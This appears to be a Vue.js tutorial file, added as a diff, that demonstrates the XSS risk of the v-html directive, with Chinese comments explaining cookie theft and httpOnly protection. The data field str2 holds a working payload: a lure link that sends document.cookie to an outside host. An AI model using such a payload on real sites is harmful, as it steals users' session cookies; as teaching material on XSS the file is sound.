@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+    <!-- 导入 vue 文件    注意路径不一定每一次都一样 -->
+    <script src="../../js/vue.js"></script>
+  </head>
+<!-- 
+    右键   open with live server 采用开启端口的方式
+    先去浏览器添加一个cookie  点击检查,其次点击应用,然后找到cookie
+    点击然后依次给key 和 value 赋值
+    然后再点击a标签,(由于a标签存在document.cookie,这个会把你的cookie全部获取到)
+     发现地址栏变为https://www.baidu.com/?a=1;%20b=2
+    所以下面的str2很危险,点击之后,顺带着把你的cookie带到别的网站,然后,某个坏蛋就可以通过这个网站获取到你的cookie
+    从而获得你的认证信息,这是一个隐患
+    
+(但是如果cookie上httpOnly那一栏打上了对勾  这样就只有http协议可以读取和携带 这样算是有个保障)
+
+如果chrome不能添加cookie
+    Chrome中访问地址chrome://flags
+2、搜索Partitioned cookies将设置项改为Enabled即可，
+3、点击右下角relaunch
+4、然后就可以重新手动添加cookie了
+
+
+v-html指令:
+1. 作用:向指定节点中渲染包含html结构的内容。
+2.与插值语法的区别:
+(1).v-html会替换掉节点中所有的内容，{{xx}}则不会 。
+(2).v-html可以识别html结构。
+3.严重注意: v-htm1有安全性问题! ! ! !
+1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS(跨站脚本攻击)攻击。
+(2).一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上!⭐⭐⭐⭐
+ -->
+  <body>
+    <!-- 被 vm 实例所控制的区域  亦或是模板，容器-->
+    <div id="app">
+        <div>{{name}}</div>
+        <div v-html="str"></div>
+        <div v-html="str2"></div>
+    </div>
+
+    <script>
+        Vue.config.productionTip=false;
+      //创建 vm 实例对象
+      const vm = new Vue({
+        //指定控制的区域
+        el:'#app',
+        data:{
+            name:'我落泪,情绪零碎',
+            str:'<h1>你的世界一幕幕纷飞</h1>',
+            // v-html 就可以解析标签  v-text不支持  location.href也可以实现跳转  document.cookie获取所有cookie
+            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点我领取VIP10礼包,限时领取!!</a>',
+        },
+       });
+    </script>
+  </body>
+</html>
